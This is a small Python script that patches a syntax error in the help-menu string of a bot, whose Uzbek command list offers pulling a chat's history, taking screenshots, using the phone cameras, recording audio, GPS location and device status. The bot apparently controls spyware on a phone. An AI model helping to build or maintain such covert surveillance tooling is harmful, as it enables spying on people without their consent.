#!/usr/bin/env python3
from pathlib import Path

path = Path("/opt/hullas/bot.py")
text = path.read_text()

broken = '''            "/sync_ID — Bitta chat tarixini tortish
/screenshot — Ekran nusxasi
/cam_back — Orqa kamera
/cam_front — Old kamera
/record 15 — Audio yozish
/location — GPS lokatsiya
/device — Telefon holati",'''

fixed = '''            "/sync_ID — Bitta chat tarixini tortish\\n"
            "/screenshot — Ekran nusxasi\\n"
            "/cam_back — Orqa kamera\\n"
            "/cam_front — Old kamera\\n"
            "/record 15 — Audio yozish\\n"
            "/location — GPS lokatsiya\\n"
            "/device — Telefon holati",'''

if broken in text:
    text = text.replace(broken, fixed)
    path.write_text(text)
    print("fixed OK")
else:
    print("pattern not found, manual fix needed")